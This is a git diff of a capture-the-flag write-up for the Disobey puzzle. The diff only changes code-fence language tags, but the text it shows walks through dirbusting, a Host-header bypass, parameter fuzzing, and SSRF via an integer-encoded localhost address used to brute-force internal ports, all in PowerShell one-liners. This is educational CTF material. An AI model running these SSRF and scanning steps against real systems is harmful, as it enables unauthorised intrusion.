@@ -41,7 +41,7 @@ Back to the front page of the puzzle. Viewing source for puzzle.disobey.fi shows
 
 Storing the lorem ipsum into original_lorem.txt we can use the content for dirbusting. Most of the time, the response seems to be 404, so I ended up writing a script that tries to find non-404 answers.
 
-```PowerShell
+```powershell
 [cmdletbinding()]
 Param()
 	
@@ -69,19 +69,19 @@ Stupid thing in dirbusting with PowerShell is that invoke-webrequest throws exce
 
 The 401 error we got means that we were unauthorized and the error wrong vhost hints that we might want to try to change host header. Trying it out is simple.
 
-```PowerShell
+```powershell
 invoke-webrequest http://puzzle.disobey.fi/Interdum -UseBasicParsing -Headers @{Host="lol"}
 ```
 
 We got a new error: "Try harder - admin". This one was actually a hint. We just needed to use admin as a host header. 
 
-```PowerShell
+```powershell
 invoke-webrequest http://puzzle.disobey.fi/Interdum -UseBasicParsing -Headers @{Host="admin"}
 ```
 
 Yey, we got a new error: Return Greetings! Love you <3 - I need -love also. Yet again this was actually a hint. The thing we needed to do was to append the -love to the url. 
 
-```PowerShell
+```powershell
 invoke-webrequest http://puzzle.disobey.fi/Interdum-love -UseBasicParsing -Headers @{Host="admin"}
 ```
 
@@ -108,7 +108,7 @@ SnVzdCBraWRkaW5nIC0gYmFzZTY0IGlzIGF3ZXNvbWUu
 
 The encryption looks a lot like Base64 so we will give it a shot first. 
 
-```PowerShell
+```powershell
 [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("SnVzdCBraWRkaW5nIC0gYmFzZTY0IGlzIGF3ZXNvbWUu"))
 ```
 
@@ -116,7 +116,7 @@ The neat thing about PowerShell is that it is built on top of .NET. So all the .
 
 Accessing test.php gives us 403 unauthorized. So we have actually bypassed authentication already but something is still not working. The first step would be to understand how can we use the php with http requests. We go again to the SecLists and look for common parameter names like [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt). Then we create a PowerShell script ps_admin_test_params_verbose.ps1 that we can use for trying it out. 
 
-```PowerShell
+```powershell
 [cmdletbinding()]
 Param(
 	[string]$p,
@@ -141,13 +141,13 @@ $res | % { ("Status: " + [int]$_.StatusCode +" | Length: " +$_.ContentLength) + 
 
 Once we created the help function we simply take all the parameter names and call the function with all of them trying to figure out if we can change something. 
 
-```PowerShell
+```powershell
 get-content .\burp-parameter-names.txt | % { .\ps_admin_test_params_verbose.ps1 $_ "1" }
 ```
 
 We got lucky and we can notice that calling /Interdum-love/test.php?url=1 really returns 200 without any content. So now we know the parameter that we should use. The problem is we do not understand what it is. Name "url" is a hint but it won't reveal itself too soon. After changing the parameter back and forth we can notice that it accepts numbers and number:number notations. Maybe they are IP addresses and ports? As I could not give 127.0.0.1 and I did not know that I can use 0 as an IP address I googled a bit and found a way to translate ip addresses to int. I created script called ps_ipmask_to_int.ps1.
 
-```PowerShell
+```powershell
 [cmdletbinding()]
 Param(
 	[string]$p1,
@@ -169,13 +169,13 @@ Param(
 
 By running the script with parameters 127 0 0 1 I get 2130706433 for the localhost and by changing the port to the 80 I can make an attempt. 
 
-```PowerShell
+```powershell
 invoke-webrequest http://admin/Interdum-love/test.php?url=2130706433:80 -UseBasicParsing
 ```
 
 After that I get the puzzle frontpage as a response. After that I tried to continue with the 8021 port that I found earlier with no luck. Back to brute forcing it is. What would be the correct port as I haven't found any other IP addresses? PowerShell to the rescue. First we need a script that we use to make the actual call. We take the ps_admin_test_params_verbose and make non-verbose version of it that recognizes if the content length changes.
 
-```PowerShell
+```powershell
 [cmdletbinding()]
 Param(
 	[string]$p,
@@ -205,7 +205,7 @@ $res | % { if($len -gt 0) { ("Status: " + [int]$_.StatusCode +" | Length: " +$le
 
 Then we brute force the tcp ports with oneliner. 
 
-```PowerShell 
+```powershell 
 1..65535 | % { .\ps_admin_test_params.ps1 "url" ("2130706433:"+$_) }
 ```
 
@@ -241,7 +241,7 @@ Press all the buttons in the keyboard. Preferably vvv and qq. Suddenly some magi
 
 We finally found something that uses the 8021 port. We are close but nothing really works out of the box. Thinking a bit we found a correct question. What is the url parameter for the GIVE_GIVE_GIVE_ME_MY_TICKET. Yet again we go with the PowerShell and enumerate things a bit. 
 
-```PowerShell
+```powershell
 [cmdletbinding()]
 Param(
 	[string]$p,
@@ -266,7 +266,7 @@ $res | % { if($_.RawContentLength -gt 0) { ("Status: " + [int]$_.StatusCode +" |
 
 By passing the previously used burp-parameter-names list for the script we can find out the missing parameter name.  
 
-```PowerShell
+```powershell
 get-content .\burp-parameter-names.txt | % { .\ps_8021_give_ticket_params.ps1 $_ "GET" }
 ```
 
